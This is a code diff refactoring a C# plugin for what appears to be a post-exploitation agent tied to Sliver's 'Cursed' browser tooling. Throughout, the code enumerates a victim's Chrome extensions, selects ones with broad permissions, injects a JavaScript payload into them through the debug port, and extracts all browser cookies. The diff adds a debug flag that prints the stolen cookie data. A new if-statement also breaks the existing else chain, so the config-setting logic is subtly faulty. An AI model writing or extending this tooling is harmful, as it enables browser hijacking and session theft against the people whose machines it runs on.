@@ -7,7 +7,7 @@ using cursed.Finders;
 
 namespace Agent
 {
-    public class Plugin : IInteractivePlugin, IFilePlugin
+    public partial class Plugin : IInteractivePlugin, IFilePlugin
     {
         //Todo in the cursed.py file, add a `launch` bool that would indicate that the user wants us to handle the execution of chrome with a debug port.
         //https://sliver.sh/docs?name=Cursed maybe implement some of these interactive commands
@@ -111,7 +111,7 @@ namespace Agent
                         break;
                     }
 
-                    var res = await DebugHelper.InjectJs(inputParts[1], inputParts[2], config);
+                    var res = await InjectJs(inputParts[1], inputParts[2], config, message.task_id);
                     break;
                 case "spawn":
 
@@ -151,7 +151,7 @@ namespace Agent
         {
             //Parse for chosen browser
             await ReturnOutput("[+] Getting extensions", task_id);
-            var extensions = await DebugHelper.GetExtensions(this.config);
+            var extensions = await GetExtensions(this.config, task_id);
 
             if (extensions.Count <= 0)
             {
@@ -166,12 +166,12 @@ namespace Agent
 
             foreach (var extension in extensions)
             {
-                if (!DebugHelper.TryGetManifestFromExtension(extension, task_id, out var manifest) || manifest is null)
+                if (!TryGetManifestFromExtension(extension, task_id, out var manifest) || manifest is null)
                 {
                     continue;
                 }
 
-                var permissions = DebugHelper.GetPermissionsFromManifest(manifest);
+                var permissions = GetPermissionsFromManifest(manifest);
 
                 if (permissions.Count == 0)
                 {
@@ -182,7 +182,6 @@ namespace Agent
                 {
                     extensionCandidates.Add(extension);
                 }
-
             }
 
             if (extensionCandidates.Count <= 0)
@@ -206,7 +205,7 @@ namespace Agent
             await ReturnOutput("[+] Injecting our payload", task_id);
             foreach (var extension in extensionCandidates)
             {
-                if (DebugHelper.TryInjectJs(extension, payload, out var response))
+                if (TryInjectJs(extension, payload, task_id, out var response))
                 {
                     await ReturnOutput("[+] Succesfully injected payload." + Environment.NewLine + $"Response: {response}", task_id);
                     return;
@@ -216,14 +215,19 @@ namespace Agent
         }
         private async Task<bool> TryGetCookies(string task_id)
         {
-            List<ChromeJsonObject> extensions = await DebugHelper.GetExtensions(this.config);
+            List<ChromeJsonObject> extensions = await GetExtensions(this.config, task_id);
 
             if (extensions.Count == 0)
             {
                 return false;
             }
 
-            string response = await DebugHelper.InjectGetAllCookies(extensions.First());
+            string response = await InjectGetAllCookies(extensions.First(), task_id);
+
+            if (this.config.debug)
+            {
+                await ReturnOutput(response, task_id);
+            }
 
             if (string.IsNullOrEmpty(response))
             {
@@ -311,6 +315,8 @@ namespace Agent
             {
                 if (choice == "parent")
                     property.SetValue(config, int.Parse(value.ToString()));
+                if (choice == "debug")
+                    property.SetValue(config, bool.Parse(value.ToString()));
                 else
                     property.SetValue(config, value);
 
@@ -326,7 +332,7 @@ namespace Agent
             switch (choice.ToLower())
             {
                 case "extensions":
-                    var extensions = await DebugHelper.GetExtensions(this.config);
+                    var extensions = await GetExtensions(this.config, task_id);
                     await ReturnOutput(JsonSerializer.Serialize(extensions), task_id);
                     break;
                 case "":
